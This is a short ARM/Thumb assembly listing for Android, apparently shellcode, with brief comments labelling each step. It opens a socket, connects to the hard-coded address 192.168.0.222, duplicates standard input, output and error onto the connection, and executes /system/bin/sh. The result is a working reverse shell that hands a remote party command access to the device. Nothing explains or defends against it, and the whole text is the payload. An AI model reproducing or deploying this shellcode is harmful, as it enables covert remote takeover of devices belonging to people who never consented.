# switch to Thumb mode (16-bit ops) 
        .code 32
        add     r1, pc, #1
        bx      r1

# Thumb instructions follow
        .code 16

# socket(2, 1, 0)
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25
        svc     1

# connect(r0, &addr, 16)
        mov     r6, r0
        add     r1, pc, #32
        mov     r2, #16
        add     r7, #2
        svc     1

# dup2(r0, 0/1/2)
        mov     r7, #63
        mov     r1, #2
Lb:
        mov     r0, r6
        svc     1
        sub     r1, #1
        bpl     Lb

# execve("/system/bin/sh", ["/system/bin/sh", 0], 0) 
        add     r0, pc, #20
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1

# struct sockaddr 
.align 2
.short 2
.short 12315
.byte 192,168,0,222
.ascii "/system/bin/sh\0\0"
